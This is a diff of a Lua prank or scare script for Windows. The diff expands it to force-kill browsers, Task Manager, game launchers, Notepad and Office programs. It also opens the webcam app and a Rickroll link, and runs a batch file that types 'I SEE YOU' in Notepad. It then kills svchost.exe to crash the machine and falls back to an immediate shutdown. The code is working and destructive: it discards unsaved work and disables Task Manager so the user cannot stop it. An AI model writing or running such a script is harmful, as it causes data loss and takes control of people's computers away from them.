2.1 (UNTESTED)

+++ source.lua
@@ -12,23 +12,43 @@ local dir = sys.Directory(sys.currentdir);
 
 local user = print(os.getenv('USERNAME'));
 
-
 --Functions
 
-function CloseDistractions()
+function Waiteroo(n)
+  local t = os.clock()
+  while os.clock() - t <= n do
+    -- nothing
+  end
+end
+
+function CloseDistractions()  --Close Other Programs
+  
+  --Browsers
+
   os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome
+  os.execute("taskkill /F /IM \"msedge.exe\" /T");  --Edge
+  os.execute("taskkill /F /IM \"firefox.exe\" /T");  --FireFox
+  os.execute("taskkill /F /IM \"Opera.exe\" /T");  --Opera
+
+  --System Shtuffs
 
   os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager
 
+  --Game Launchers
+
   os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam
+  os.execute("taskkill /F /IM \"EpicGamesLauncher.exe\" /T");  --EG Launcher
+
+  --Stupid Stuff Because Funny
 
   os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)
+  os.execute("taskkill /F /IM \"notepad.exe\" /T");  --Notepad
+
+  --Office
 
   os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word
-
   os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
-
-  os.execute("taskkill /F /IM \"notepad.exe\" /T");  --Notepad
+  os.execute("taskkill /F /IM \"powerpnt.exe\" /T");  --Powerpoint
 end
 
 function shutter()
@@ -67,7 +87,7 @@ ui.info("Actually, I kinda forgot what you look like!");
 
 ui.info("Let me juusssttt-");
 
-os.execute("start microsoft.windows.camera:");
+os.execute("start microsoft.windows.camera:");  --Open Windows Camera
 
 ui.info("There we go!");
 
@@ -85,17 +105,22 @@ ui.info("Actually...");
 
 ui.info("Before I go...");          
 
-os.execute("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");  
+os.execute("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");  --RICK
 
 ui.info("Hahaha!!");          
                     
 ui.warn("I\'M IN YOUR HEAD.");  
 
-ui.warn("I SEE YOU.");
+os.execute(""..dir.."extern/noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  Creepy.
+
+Waiteroo(1*05);
 
 ui.warn("...");                    
           
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
-os.execute("taskkill /F /IM \"svchost.exe\" /T");
-os.execute("shutdown /s /t 00");  --Backup
+os.execute("taskkill /F /IM \"svchost.exe\" /T");  --Crash PC (Only Works With Admin)
+
+Waiteroo(1*05);  --Wait 5 seconds before continuing
+
+os.execute("shutdown /s /t 00");  --Backup if not admin
